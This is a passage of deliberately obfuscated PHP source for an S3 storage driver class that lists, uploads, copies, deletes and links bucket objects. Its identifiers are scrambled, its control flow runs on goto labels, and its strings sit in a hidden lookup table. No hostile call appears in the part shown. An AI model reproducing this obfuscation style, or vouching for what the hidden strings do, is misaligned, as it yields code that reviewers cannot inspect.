$fçÔÊŸÏ‡Û =& $_SERVER[Ç³Íß¦Ó]; if (empty($bêÍÔê¤Ù¯)) { return array(); } $Bí­–ñ‘»Ø = array(); goto D¬„ÆîÌ­Å; fŠ å£ÃœÛ: } public function slicePath($B¼ó©¹‚‡î) { $Aí˜ùèº¯› =& $_SERVER[Ç³Íß¦Ó]; $cÏøó°‘Ô = explode($Aí˜ùèº¯›[8], trim($B¼ó©¹‚‡î, $Aí˜ùèº¯›[8])); $A¿œ®½¶Áù = 0; do { ++$A¿œ®½¶Áù; $f»êµĞ·Îå[] = implode($Aí˜ùèº¯›[8], array_slice($cÏøó°‘Ô, 0, $A¿œ®½¶Áù)) . $Aí˜ùèº¯›[8]; } while ($A¿œ®½¶Áù < count($cÏøó°‘Ô)); $f»êµĞ·Îå[count($cÏøó°‘Ô) - 1] = $B¼ó©¹‚‡î; return $f»êµĞ·Îå; } public function getHost() { $d—½Šº×¸Ö =& $_SERVER[Ç³Íß¦Ó]; $EÑ¬©ò†æ¸ = parse_url(trim($this->domain, $d—½Šº×¸Ö[8])); $CÈãÍˆÃ‹ = isset($EÑ¬©ò†æ¸[$d—½Šº×¸Ö[174]]) ? $EÑ¬©ò†æ¸[$d—½Šº×¸Ö[174]] : http_type(); $B­Ç—à‹®ß = isset($EÑ¬©ò†æ¸[$d—½Šº×¸Ö[175]]) ? $EÑ¬©ò†æ¸[$d—½Šº×¸Ö[175]] : $EÑ¬©ò†æ¸[$d—½Šº×¸Ö[76]]; if (isset($EÑ¬©ò†æ¸[$d—½Šº×¸Ö[176]])) { $B­Ç—à‹®ß .= $d—½Šº×¸Ö[4] . $EÑ¬©ò†æ¸[$d—½Šº×¸Ö[176]]; } return $CÈãÍˆÃ‹ . $d—½Šº×¸Ö[177] . $B­Ç—à‹®ß; } public function pathEncode($Fà©à£ğ­§) { $eì ¬˜˜ÊÍ =& $_SERVER[Ç³Íß¦Ó]; return str_replace($eì ¬˜˜ÊÍ[178], $eì ¬˜˜ÊÍ[8], rawurlencode($Fà©à£ğ­§)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($dØÖ•—ùé£) { set_timeout(); require_once SDK_DIR . $_SERVER[Ç³Íß¦Ó][179]; parent::__construct(); $this->_init($dØÖ•—ùé£); } public function _init($a‡ÉÂ›·°Õ) { foreach ($a‡ÉÂ›·°Õ as $fÜ‹“”° => $Cµâ‚Ğ›¸Ÿ) { if (isset($this->{$fÜ‹“”°})) { $this->{$fÜ‹“”°} = $Cµâ‚Ğ›¸Ÿ; } } $this->endpoint = $a‡ÉÂ›·°Õ[$_SERVER[Ç³Íß¦Ó][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($C„¨Ãå—ô = "\166\64") { $this->signVer = $C„¨Ãå—ô; $this->client->setSignatureVersion($C„¨Ãå—ô); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto BœÈ‹·‘ê; BŒïóº›À«: if ($fŠ¾æè¡«Ç[$AÅãœêå’Æ[181]] != $AÅãœêå’Æ[182] || $fŠ¾æè¡«Ç[$AÅãœêå’Æ[183]] != $AÅãœêå’Æ[182]) { return !1; } $Däõò©ºãÙ = array_map($AÅãœêå’Æ[184], $fŠ¾æè¡«Ç[$AÅãœêå’Æ[185]]); if (!is_array($Däõò©ºãÙ)) { $Däõò©ºãÙ = array(); } goto a‘ÎÌì¾–ï; a‘ÎÌì¾–ï: $aŠôù®œòé = array($AÅãœêå’Æ[186], $AÅãœêå’Æ[187], $AÅãœêå’Æ[188], $AÅãœêå’Æ[189], $AÅãœêå’Æ[190]); $cŠœÆ«ñ¦Á = array_diff($aŠôù®œòé, $Däõò©ºãÙ); return empty($cŠœÆ«ñ¦Á); goto EÎ„©ºÁ‹; BœÈ‹·‘ê: $AÅãœêå’Æ =& $_SERVER[Ç³Íß¦Ó]; $fŠ¾æè¡«Ç = $this->getBucketCors(); if (!$fŠ¾æè¡«Ç || !is_array($fŠ¾æè¡«Ç)) { return !1; } goto BŒïóº›À«; EÎ„©ºÁ‹: } public function mkfile($e½Å¡İ…ò, $ešßó÷ÀâÕ = '', $bí÷„…Š¬ = REPEAT_RENAME) { $fÜ…Ğª¥‡Œ = $this->setContent($e½Å¡İ…ò, $ešßó÷ÀâÕ); if ($fÜ…Ğª¥‡Œ !== !1) { return $this->getPathOuter($e½Å¡İ…ò); } return !1; } public function mkdir($dµˆŸŸ¼öÑ, $EÙÚ†¸ëŸ = REPEAT_SKIP) { if (empty($dµˆŸŸ¼öÑ)) { return !1; } if ($this->_isFolder($dµˆŸŸ¼öÑ)) { return $this->getPathOuter($dµˆŸŸ¼öÑ); } $Cİ¦ãäÚµ× = $this->setContent($dµˆŸŸ¼öÑ, $_SERVER[Ç³Íß¦Ó][33], !0); if ($Cİ¦ãäÚµ× !== !1) { return $this->getPathOuter($dµˆŸŸ¼öÑ); } return !1; } public function copyFile($Aº§´£ÃÅ°, $F…«Í­¹í–, $Bò¤‚Á…¤” = array()) { $DÔ‘ …Ùƒ¸ =& $_SERVER[Ç³Íß¦Ó]; $cÇ²°–ÍÅ = $this->objectMeta($Aº§´£ÃÅ°); if (!$cÇ²°–ÍÅ) { return !1; } if ($cÇ²°–ÍÅ[$DÔ‘ …Ùƒ¸[78]] <= 1024 * 1024 * 200) { $cÈƒÄ±£È’ = $this->client->copyObject($this->bucket, $Aº§´£ÃÅ°, $this->bucket, $F…«Í­¹í–, $DÔ‘ …Ùƒ¸[191], $Bò¤‚Á…¤”); } else { $cÈƒÄ±£È’ = $this->client->multiCopyObject($this->bucket, $Aº§´£ÃÅ°, $this->bucket, $F…«Í­¹í–, $Bò¤‚Á…¤”); } $cÈƒÄ±£È’ = $cÈƒÄ±£È’ ? $this->getPathOuter($F…«Í­¹í–) : !1; return $cÈƒÄ±£È’; } public function moveFile($f±ó×å–ÙÔ, $D¼ê›ÉŞ) { if ($this->copyFile($f±ó×å–ÙÔ, $D¼ê›ÉŞ)) { $this->delFile($f±ó×å–ÙÔ); return $this->getPathOuter($D¼ê›ÉŞ); } return !1; } public function delFile($b˜­†©Ë×Ô) { return $this->client->deleteObject($this->bucket, $b˜­†©Ë×Ô); } public function delFolder($f…µ³Í’Û) { goto BËÂªŠÔİ¼; AîÖåø•ù: if (!empty($f…µ³Í’Û) && !in_array($c¶å¿åÎ’å, $Ašˆ¶ƒÄŒ¹[$B¹¸‚Ä‰[75]])) { $Ašˆ¶ƒÄŒ¹[$B¹¸‚Ä‰[75]][] = $c¶å¿åÎ’å; } $E²Â»‚ø¢Æ = $this->delByBatch($Ašˆ¶ƒÄŒ¹[$B¹¸‚Ä‰[74]]); if (!$E²Â»‚ø¢Æ) { return !1; } goto e«‰¯ÀâÁ; e«‰¯ÀâÁ: return $this->delByBatch($Ašˆ¶ƒÄŒ¹[$B¹¸‚Ä‰[75]]); goto E’¹ƒôØ¤; cƒìÊ§çË: $Ašˆ¶ƒÄŒ¹ = $this->fileList($f…µ³Í’Û); $this->listItemCache = !0; $c¶å¿åÎ’å = trim($f…µ³Í’Û, $B¹¸‚Ä‰[8]) . $B¹¸‚Ä‰[8]; goto AîÖåø•ù; BËÂªŠÔİ¼: $B¹¸‚Ä‰ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->exist($f…µ³Í’Û)) { return !0; } $this->listItemCache = !1; goto cƒìÊ§çË; E’¹ƒôØ¤: } private function delByBatch($f¾ÀîÙ°•Ü) { foreach (array_chunk($f¾ÀîÙ°•Ü, 1000) as $fßÜä‡Œ˜¤) { $dñÆŠŠšØƒ = $this->client->deleteObjects($this->bucket, $fßÜä‡Œ˜¤); if (!$dñÆŠŠšØƒ) { return !1; } } return !0; } public function rename($dáˆìÚôÂƒ, $E‚½–Ñ·¢˜) { return $this->renameObject($dáˆìÚôÂƒ, $E‚½–Ñ·¢˜); } public function listPath($B¦ƒÚõóª›, $B¶–·ÄÎ±» = false) { $aŸ”¼®‹¨Î =& $_SERVER[Ç³Íß¦Ó]; $dŠ©ÑäÙ– = $this->fileList($B¦ƒÚõóª›, $aŸ”¼®‹¨Î[8], !0); foreach ($dŠ©ÑäÙ–[$aŸ”¼®‹¨Î[75]] as $BŞô›áğ× => $fÓŠôª‰¾Õ) { $dŠ©ÑäÙ–[$aŸ”¼®‹¨Î[75]][$BŞô›áğ×] = $this->folderInfo($fÓŠôª‰¾Õ, $B¶–·ÄÎ±»); } foreach ($dŠ©ÑäÙ–[$aŸ”¼®‹¨Î[74]] as $BŞô›áğ× => $fÓŠôª‰¾Õ) { $dŠ©ÑäÙ–[$aŸ”¼®‹¨Î[74]][$BŞô›áğ×] = $this->fileInfo($fÓŠôª‰¾Õ[$aŸ”¼®‹¨Î[28]], $B¶–·ÄÎ±», $fÓŠôª‰¾Õ); } return $dŠ©ÑäÙ–; } private function fileInfo($eê£Á´Ó ¿, $B®ù´óíÜ = false, $d˜”à¶©¥¬ = array()) { goto FæÜÑÚ…½; Eò‘Åã‚ÑÎ: if (isset($d˜”à¶©¥¬[$bÒ¾ğŠ¡ï«[196]])) { $cèØ‘•¡Äœ[$bÒ¾ğŠ¡ï«[84]] = $d˜”à¶©¥¬[$bÒ¾ğŠ¡ï«[196]]; } if (isset($d˜”à¶©¥¬[$bÒ¾ğŠ¡ï«[78]])) { $cèØ‘•¡Äœ[$bÒ¾ğŠ¡ï«[78]] = $d˜”à¶©¥¬[$bÒ¾ğŠ¡ï«[78]]; } return $cèØ‘•¡Äœ; goto B¶õ´”ğ†º; cîæŞâ•ï‡: $cèØ‘•¡Äœ[$bÒ¾ğŠ¡ï«[193]] = $cèØ‘•¡Äœ[$bÒ¾ğŠ¡ï«[84]] = 0; $cèØ‘•¡Äœ[$bÒ¾ğŠ¡ï«[194]] = $cèØ‘•¡Äœ[$bÒ¾ğŠ¡ï«[195]] = !0; if (empty($d˜”à¶©¥¬)) { $d˜”à¶©¥¬ = $this->objectMeta($eê£Á´Ó ¿); if (!$d˜”à¶©¥¬) { return $cèØ‘•¡Äœ; } } goto Eò‘Åã‚ÑÎ; FæÜÑÚ…½: $bÒ¾ğŠ¡ï« =& $_SERVER[Ç³Íß¦Ó]; $cèØ‘•¡Äœ = array($bÒ¾ğŠ¡ï«[28] => $this->pathThis($eê£Á´Ó ¿), $bÒ¾ğŠ¡ï«[76] => $this->getPathOuter($eê£Á´Ó ¿), $bÒ¾ğŠ¡ï«[29] => $bÒ¾ğŠ¡ï«[192], $bÒ¾ğŠ¡ï«[168] => $this->ext($eê£Á´Ó ¿), $bÒ¾ğŠ¡ï«[78] => isset($d˜”à¶©¥¬[$bÒ¾ğŠ¡ï«[78]]) ? $d˜”à¶©¥¬[$bÒ¾ğŠ¡ï«[78]] : 0); if ($B®ù´óíÜ) { return $cèØ‘•¡Äœ; } goto cîæŞâ•ï‡; B¶õ´”ğ†º: } private function folderInfo($aÌ¬àù‡, $B¤‚İö–ï‚ = false) { goto d–—œŒ„©Ì; d–—œŒ„©Ì: $EÏéƒ”¦Ë =& $_SERVER[Ç³Íß¦Ó]; $bùÃªè°É = array($EÏéƒ”¦Ë[28] => $this->pathThis($aÌ¬àù‡), $EÏéƒ”¦Ë[76] => $this->getPathOuter($EÏéƒ”¦Ë[8] . $aÌ¬àù‡), $EÏéƒ”¦Ë[29] => $EÏéƒ”¦Ë[77]); if ($B¤‚İö–ï‚) { return $bùÃªè°É; } goto Bí·Ô»«Ï¸; F¡£·½©È: $aÌ¬àù‡ = trim($aÌ¬àù‡, $EÏéƒ”¦Ë[8]) . $EÏéƒ”¦Ë[8]; $Cˆ÷¤º´ñ = $this->objectMeta($aÌ¬àù‡); if (isset($Cˆ÷¤º´ñ[$EÏéƒ”¦Ë[196]])) { $bùÃªè°É[$EÏéƒ”¦Ë[193]] = $Cˆ÷¤º´ñ[$EÏéƒ”¦Ë[196]]; } goto aùÒ–¯œ¨; Bí·Ô»«Ï¸: $bùÃªè°É[$EÏéƒ”¦Ë[193]] = $bùÃªè°É[$EÏéƒ”¦Ë[84]] = 0; $bùÃªè°É[$EÏéƒ”¦Ë[194]] = $bùÃªè°É[$EÏéƒ”¦Ë[195]] = !0; if ($aÌ¬àù‡ == $EÏéƒ”¦Ë[33]) { return $bùÃªè°É; } goto F¡£·½©È; aùÒ–¯œ¨: return $bùÃªè°É; goto bËõì¥÷ì; bËõì¥÷ì: } private function fileList($dĞÊÏÑá¤, $bùÌ«…¥îÁ = '', $d±¾Û…é˜ = 0) { goto FÄŒìØÊ; cæ™ì÷¦ŸÎ: if (!$e¸‹›÷—ß) { return array($aŠµöˆÓ‡Ë[75] => array(), $aŠµöˆÓ‡Ë[74] => array()); } $E¬Î²ÙÊÖ = $this->listItemCache === !1 ? !1 : !0; $e‚ÈèÓ“¤– = $a‚–³Ö¥“ = array(); goto b‘•İŠÓ; FÄŒìØÊ: $aŠµöˆÓ‡Ë =& $_SERVER[Ç³Íß¦Ó]; $cà˜ËØ²µô = rtrim($dĞÊÏÑá¤, $aŠµöˆÓ‡Ë[8]) . $aŠµöˆÓ‡Ë[8]; $e¸‹›÷—ß = $this->listObjs($cà˜ËØ²µô, null, null, $bùÌ«…¥îÁ); goto cæ™ì÷¦ŸÎ; b‘•İŠÓ: foreach ($e¸‹›÷—ß[$aŠµöˆÓ‡Ë[197]] as $A³¡ÀÍÆæ) { goto eì™Ÿ¸Ëİí; eì™Ÿ¸Ëİí: $DÁˆ± ¬ = $A³¡ÀÍÆæ[$aŠµöˆÓ‡Ë[28]]; if ($DÁˆ± ¬ == $cà˜ËØ²µô) { continue; } $c–‰‘…ÇŒå = isset($A³¡ÀÍÆæ[$aŠµöˆÓ‡Ë[78]]) ? $A³¡ÀÍÆæ[$aŠµöˆÓ‡Ë[78]] : 0; goto aïéçµÉÊÛ; FÛåôêÀ…: $a‚–³Ö¥“[] = $d±¾Û…é˜ ? $A³¡ÀÍÆæ : $DÁˆ± ¬; goto AÙŒ‘£¢Úø; aïéçµÉÊÛ: $AĞ‰‰ÁŠœ¼ = $c–‰‘…ÇŒå == 0 && substr($DÁˆ± ¬, strlen($DÁˆ± ¬) - 1, 1) == $aŠµöˆÓ‡Ë[8] ? !0 : !1; if ($E¬Î²ÙÊÖ) { $this->cacheMethod($aŠµöˆÓ‡Ë[198], $DÁˆ± ¬, $AĞ‰‰ÁŠœ¼); $this->cacheMethod($aŠµöˆÓ‡Ë[199], $DÁˆ± ¬, $A³¡ÀÍÆæ); } if ($AĞ‰‰ÁŠœ¼) { $e‚ÈèÓ“¤–[] = $DÁˆ± ¬; continue; } goto FÛåôêÀ…; AÙŒ‘£¢Úø: } foreach ($e¸‹›÷—ß[$aŠµöˆÓ‡Ë[200]] as $A³¡ÀÍÆæ) { $e‚ÈèÓ“¤–[] = $A³¡ÀÍÆæ[$aŠµöˆÓ‡Ë[28]]; if ($E¬Î²ÙÊÖ) { $this->cacheMethod($aŠµöˆÓ‡Ë[198], $A³¡ÀÍÆæ[$aŠµöˆÓ‡Ë[28]], !0); } } if ($E¬Î²ÙÊÖ) { $this->cacheMethod($aŠµöˆÓ‡Ë[198], $dĞÊÏÑá¤, !0); } goto cŠãøµ¤; cŠãøµ¤: return array($aŠµöˆÓ‡Ë[75] => $e‚ÈèÓ“¤–, $aŠµöˆÓ‡Ë[74] => $a‚–³Ö¥“); goto c¾¬¾´©; c¾¬¾´©: } private function listObjs($Bµø†ï‹Ü¢, $a¿Ê‚«å™ = null, $a¦‡Óç¹§ = null, $bÑÏÇ¿Û” = null) { $cé×á‚Ë¬š =& $_SERVER[Ç³Íß¦Ó]; $Bµø†ï‹Ü¢ = trim($Bµø†ï‹Ü¢, $cé×á‚Ë¬š[8]); $CêÒ‰†êİÒ = empty($Bµø†ï‹Ü¢) ? $cé×á‚Ë¬š[33] : $Bµø†ï‹Ü¢ . $cé×á‚Ë¬š[8]; return $this->client->getBucket($this->bucket, $CêÒ‰†êİÒ, $a¿Ê‚«å™, $a¦‡Óç¹§, $bÑÏÇ¿Û”, !0); } public function has($C‘„»«‰™‡, $eãè‹Ø›è = false, $AÀ¯¡ğ’ = true) { goto EÊ¢™ŒåÏÂ; C™‚ÖÄŠÈğ: $c’‘‚¤´Ã = $Eèâá­¡Î„ = array(); while (!0) { $fóºŞ¢µ±Î = $this->listObjs($C‘„»«‰™‡, $aÍØ”æ¡Ì, $E¤¥óĞÄË…, $FŒø‡¹«Ù¸); if (!$fóºŞ¢µ±Î) { break; } $aÍØ”æ¡Ì = $fóºŞ¢µ±Î[$F­Ñ¼Í—Œ[201]]; $aí¶ˆªâÛÍ = $fóºŞ¢µ±Î[$F­Ñ¼Í—Œ[197]]; $FˆäÚ†­½ß = $fóºŞ¢µ±Î[$F­Ñ¼Í—Œ[200]]; if (empty($aí¶ˆªâÛÍ) && empty($FˆäÚ†­½ß)) { break; } if (count($aí¶ˆªâÛÍ) == 1 && $aí¶ˆªâÛÍ[0][$F­Ñ¼Í—Œ[28]] == $AêˆÇÊ‚ˆå) { break; } if ($eãè‹Ø›è) { if (count($aí¶ˆªâÛÍ)) { $aí¶ˆªâÛÍ = array_column($aí¶ˆªâÛÍ, $F­Ñ¼Í—Œ[28]); $c’‘‚¤´Ã = array_merge($c’‘‚¤´Ã, $aí¶ˆªâÛÍ); } if (count($FˆäÚ†­½ß)) { $FˆäÚ†­½ß = array_column($FˆäÚ†­½ß, $F­Ñ¼Í—Œ[28]); $Eèâá­¡Î„ = array_merge($Eèâá­¡Î„, $FˆäÚ†­½ß); } if ($aÍØ”æ¡Ì === null) { break; } continue; } if ($AÀ¯¡ğ’) { if (!empty($aí¶ˆªâÛÍ)) { if (count($aí¶ˆªâÛÍ) > 1 || isset($aí¶ˆªâÛÍ[0][$F­Ñ¼Í—Œ[28]]) && $aí¶ˆªâÛÍ[0][$F­Ñ¼Í—Œ[28]] != $AêˆÇÊ‚ˆå) { return !0; } } } else { if (!empty($FˆäÚ†­½ß)) { return !0; } } if ($aÍØ”æ¡Ì === null) { break; } } if ($eãè‹Ø›è) { $c’‘‚¤´Ã = array_diff($c’‘‚¤´Ã, array($AêˆÇÊ‚ˆå)); $c’‘‚¤´Ã = count(array_unique($c’‘‚¤´Ã)); $Eèâá­¡Î„ = count(array_unique($Eèâá­¡Î„)); return array($F­Ñ¼Í—Œ[202] => $c’‘‚¤´Ã, $F­Ñ¼Í—Œ[203] => $Eèâá­¡Î„); } goto aÔÈ¤›Òğ; EÊ¢™ŒåÏÂ: $F­Ñ¼Í—Œ =& $_SERVER[Ç³Íß¦Ó]; $C‘„»«‰™‡ = trim($C‘„»«‰™‡, $F­Ñ¼Í—Œ[8]); $AêˆÇÊ‚ˆå = empty($C‘„»«‰™‡) ? $F­Ñ¼Í—Œ[33] : $C‘„»«‰™‡ . $F­Ñ¼Í—Œ[8]; goto EèœÛˆ¸óë; EèœÛˆ¸óë: $aÍØ”æ¡Ì = null; $E¤¥óĞÄË… = 500; $FŒø‡¹«Ù¸ = $F­Ñ¼Í—Œ[8]; goto C™‚ÖÄŠÈğ; aÔÈ¤›Òğ: return !1; goto b‹‘Ì´êš‹; b‹‘Ì´êš‹: } public function listAll($aî¬Ö¸Ó‰) { $AÒùºÑ‚é =& $_SERVER[Ç³Íß¦Ó]; $F’¬éèò÷ = $this->fileList($aî¬Ö¸Ó‰, $AÒùºÑ‚é[33], !0); $f±Ş÷²ŸÙ„ = array(); foreach ($F’¬éèò÷[$AÒùºÑ‚é[74]] as $C×‚‚¦©Äò) { $f±Ş÷²ŸÙ„[$C×‚‚¦©Äò[$AÒùºÑ‚é[28]]] = $C×‚‚¦©Äò[$AÒùºÑ‚é[78]]; } foreach ($F’¬éèò÷[$AÒùºÑ‚é[75]] as $C×‚‚¦©Äò) { if (is_string($C×‚‚¦©Äò)) { $f±Ş÷²ŸÙ„[$C×‚‚¦©Äò] = 0; } } return $this->listAllFiles($aî¬Ö¸Ó‰, array_keys($f±Ş÷²ŸÙ„), $f±Ş÷²ŸÙ„); } public function canRead($Cèƒìš§§·) { $Aòà¹Š’¼Ë =& $_SERVER[Ç³Íß¦Ó]; $f¥‰ñœÔ³ğ = $this->client->getAccessControlPolicy($this->bucket, $Cèƒìš§§·); if (!$f¥‰ñœÔ³ğ) { return !1; } return in_array($f¥‰ñœÔ³ğ, array($Aòà¹Š’¼Ë[204], $Aòà¹Š’¼Ë[205], $Aòà¹Š’¼Ë[206])) ? !0 : !1; } public function canWrite($C×Ş±À¸™) { $CŒ‚íà»êè =& $_SERVER[Ç³Íß¦Ó]; $FìÕù”ºÌ¼ = $this->client->getAccessControlPolicy($this->bucket, $C×Ş±À¸™); if (!$FìÕù”ºÌ¼) { return !1; } return in_array($FìÕù”ºÌ¼, array($CŒ‚íà»êè[204], $CŒ‚íà»êè[205])) ? !0 : !1; } public function getContent($fïèğÂ“¬ã) { return $this->client->getObject($this->bucket, $fïèğÂ“¬ã); } public function setContent($EÙº„Šî, $dŒÈå…÷Ş› = '', $Fø†‘˜Õä– = false) { goto eåÑÌ½Â¸Ó; C´ƒŒàó‚£: $this->cacheMethod(null, null); $F¥‡ÎœÎï = $this->copyFile($EÙº„Šî, $EÙº„Šî, array($CÎ±ïŠÃÔ‹[207] => $F¥‡ÎœÎï[$CÎ±ïŠÃÔ‹[208]])); return $F¥‡ÎœÎï ? !0 : !1; goto B¾¡•Ÿ„µ›; F¿¸™”‚äˆ: $F¥‡ÎœÎï = $this->client->putObject($dŒÈå…÷Ş›, $this->bucket, $EÙº„Šî, $CÎ±ïŠÃÔ‹[191], array(), $e«‰¾êŒãÕ); if (!$F¥‡ÎœÎï) { return !1; } if ($Fø†‘˜Õä–) { return !0; } goto C´ƒŒàó‚£; eåÑÌ½Â¸Ó: $CÎ±ïŠÃÔ‹ =& $_SERVER[Ç³Íß¦Ó]; $EÙº„Šî = $Fø†‘˜Õä– ? trim($EÙº„Šî, $CÎ±ïŠÃÔ‹[8]) . $CÎ±ïŠÃÔ‹[8] : $EÙº„Šî; $e«‰¾êŒãÕ = get_file_mime(get_path_ext($EÙº„Šî)); goto F¿¸™”‚äˆ; B¾¡•Ÿ„µ›: } public function fileSubstr($d´ÈÇ¶¥ïÉ, $Dªé•á¾ŸÉ, $Cñäç­Ã) { $E–® ‚ºé = $Dªé•á¾ŸÉ + $Cñäç­Ã - 1; return $this->client->getObject($this->bucket, $d´ÈÇ¶¥ïÉ, array($_SERVER[Ç³Íß¦Ó][209] => "\142\171\164\x65\163\75{$Dªé•á¾ŸÉ}\x2d{$E–® ‚ºé}")); } public function upload($cËÚ¥Š¼”³, $A™‹ƒ›‹Ü, $CĞØÎš¯ Ã = false, $BíæÈ¼†Ê = REPEAT_REPLACE) { $EÏÉÖ‡¨´Í =& $_SERVER[Ç³Íß¦Ó]; $aæ¶ä–Ö°ç = array($EÏÉÖ‡¨´Í[207] => @md5_file($A™‹ƒ›‹Ü)); $C ÉŒº¼ó¤ = array($EÏÉÖ‡¨´Í[210] => get_file_mime(get_path_ext($cËÚ¥Š¼”³))); if (IO::size($A™‹ƒ›‹Ü) <= 1024 * 1024 * 200) { $a«ÕÂÏÉÁ‹ = $this->client->putObjectFile($A™‹ƒ›‹Ü, $this->bucket, $cËÚ¥Š¼”³, $EÏÉÖ‡¨´Í[191], $aæ¶ä–Ö°ç, $C ÉŒº¼ó¤); return !empty($a«ÕÂÏÉÁ‹) ? $this->getPathOuter($cËÚ¥Š¼”³) : !1; } $cˆç­Ç¸” = $this->client->multiUploadObject($A™‹ƒ›‹Ü, $this->bucket, trim($cËÚ¥Š¼”³, $EÏÉÖ‡¨´Í[8]), $aæ¶ä–Ö°ç, $C ÉŒº¼ó¤); return $cˆç­Ç¸” ? $this->getPathOuter($cËÚ¥Š¼”³) : !1; } public function download($Aª‡ì½‹²í, $CºÎ–²Ê„Ê) { if (!@is_dir($this->pathFather($CºÎ–²Ê„Ê)) && !IO::mkdir($this->pathFather($CºÎ–²Ê„Ê))) { return !1; } $b¾åØ îéÇ = $this->client->getObject($this->bucket, $Aª‡ì½‹²í, array(), $CºÎ–²Ê„Ê); return $b¾åØ îéÇ !== !1 ? $CºÎ–²Ê„Ê : !1; } public function link($aŒ‚°¼­Ë, $Bã…ìù¿ò = array()) { $a¯ßÌµ¨‡  =& $_SERVER[Ç³Íß¦Ó]; if ($this->signVer == $a¯ßÌµ¨‡ [211]) { return $this->client->getAuthenticatedURL($this->bucket, $aŒ‚°¼­Ë, 3600 * 12, $Bã…ìù¿ò); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($aŒ‚°¼­Ë, $a¯ßÌµ¨‡ [8]), 3600 * 12, $this->region, array(), !0, $Bã…ìù¿ò); } public function fileOut($açŒÄ§â“¦, $e±ÄÀƒù” = false, $a‚†Ô‚™†ã = false, $F°ª››İè = '') { goto cŒŠÌìóºÉ; e¹÷óº‰Æß: $A¿à äŞÎ = get_file_mime(get_path_ext($a‚†Ô‚™†ã)); if ($A¿à äŞÎ == $DìÃ†À¾Àš[212]) { return parent::fileOut($açŒÄ§â“¦, $e±ÄÀƒù”, $a‚†Ô‚™†ã, $F°ª››İè); } $e±ÄÀƒù” = $e±ÄÀƒù” ? $DìÃ†À¾Àš[213] : $DìÃ†À¾Àš[214]; goto D†ŞĞƒŠº; D†ŞĞƒŠº: $EŒ®—¶Á† = array($DìÃ†À¾Àš[215] => $e±ÄÀƒù” . $DìÃ†À¾Àš[216] . rawurlencode($a‚†Ô‚™†ã), $DìÃ†À¾Àš[217] => $A¿à äŞÎ); $cô‚÷—…šÛ = $this->link($açŒÄ§â“¦, $EŒ®—¶Á†); $this->fileOutLink($cô‚÷—…šÛ); goto C´¼äÖ­ƒë; cŒŠÌìóºÉ: $DìÃ†À¾Àš =& $_SERVER[Ç³Íß¦Ó]; if ($this->isFileOutServer()) { return $this->fileOutServer($açŒÄ§â“¦, $e±ÄÀƒù”, $a‚†Ô‚™†ã, $F°ª››İè); } if (!$a‚†Ô‚™†ã) { $a‚†Ô‚™†ã = $this->pathThis($açŒÄ§â“¦); } goto e¹÷óº‰Æß; C´¼äÖ­ƒë: } public function fileOutServer($CÆ²ùÇÜá, $D—õæ¹×¥È = false, $AÊ¸ºªÀ·¼ = false, $BÖÇ‡»‡Ä = '') { parent::fileOut($CÆ²ùÇÜá, $D—õæ¹×¥È, $AÊ¸ºªÀ·¼, $BÖÇ‡»‡Ä); } public function fileOutImageServer($D‹í£…Ÿ˜, $DØæ›¹ù¨ = 250) { parent::fileOutImage($D‹í£…Ÿ˜, $DØæ›¹ù¨); } public function hashMd5($f§•ÃÙ„èœ, $f¿†‘¼ÀÅ¼ = '') { $e°­÷Èáá =& $_SERVER[Ç³Íß¦Ó]; $eó¾…Êƒ¤ = $this->objectMeta($f§•ÃÙ„èœ); if (!$eó¾…Êƒ¤) { return !1; } $f¿†‘¼ÀÅ¼ = $f¿†‘¼ÀÅ¼ ? $f¿†‘¼ÀÅ¼ : _get($eó¾…Êƒ¤, $e°­÷Èáá[218]); $f¿†‘¼ÀÅ¼ = $f¿†‘¼ÀÅ¼ ? $f¿†‘¼ÀÅ¼ : _get($eó¾…Êƒ¤, $e°­÷Èáá[208], $e°­÷Èáá[33]); return $f¿†‘¼ÀÅ¼; } public function uploadFormData($f¿™ïôĞ†…, $bïæÆÕ¢¾Ğ = 3600) { $fí¯Î’¥ëÛ =& $_SERVER[Ç³Íß¦Ó]; $aÎò¾©ß¥ = $this->pathFather($f¿™ïôĞ†…); $eù¾Š¯åÎ = $this->client->getHttpUploadPostParams($this->bucket, $aÎò¾©ß¥, $fí¯Î’¥ëÛ[191], $bïæÆÕ¢¾Ğ); return array_merge((array) $eù¾Š¯åÎ, array($fí¯Î’¥ëÛ[175] => $this->getHost())); } public function multiUploadFormData($bİ¾§ƒ£ÕÙ, $f‡™µ×â…‘ = 3600) { $aÑò¢Ä“§‡ =& $_SERVER[Ç³Íß¦Ó]; $BŒËÙÃïÖÚ = gmdate($aÑò¢Ä“§‡[219]); $BìÊâ‹æÖè = array(); $aÜÎ‹…³Ş = $this->client->getUploadId($this->bucket, $bİ¾§ƒ£ÕÙ, $BìÊâ‹æÖè); if (!$aÜÎ‹…³Ş) { return !1; } return array($aÑò¢Ä“§‡[220] => $aÜÎ‹…³Ş, $aÑò¢Ä“§‡[175] => $this->getHost() . $aÑò¢Ä“§‡[8] . $this->pathEncode($bİ¾§ƒ£ÕÙ), $aÑò¢Ä“§‡[221] => $BŒËÙÃïÖÚ, $aÑò¢Ä“§‡[93] => $bİ¾§ƒ£ÕÙ); } public function multiUploadAuthData($fß‡³ê°§¶, $FšÇĞ‰™œ = array()) { goto E°¤ÛÍ»ğì; a’´ÃŠÉÀØ: $FÏŠÜó°ø = array($dÕ®ÊğÉƒ”[223], $dÕ®ÊğÉƒ”[33], $dÕ®ÊğÉƒ”[119], $dÕ®ÊğÉƒ”[33], "\170\x2d\141\155\172\x2d\x64\141\164\145\72{$Bä©£ÖÜÏ}", $dÕ®ÊğÉƒ”[8] . $this->bucket . $dÕ®ÊğÉƒ”[8] . $this->pathEncode($eï…“ö²ˆË) . $ešâÒªË‘›); if (strpos($ešâÒªË‘›, $dÕ®ÊğÉƒ”[224]) === 0) { $FÏŠÜó°ø[0] = $dÕ®ÊğÉƒ”[225]; } if (isset($FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[226]]) && 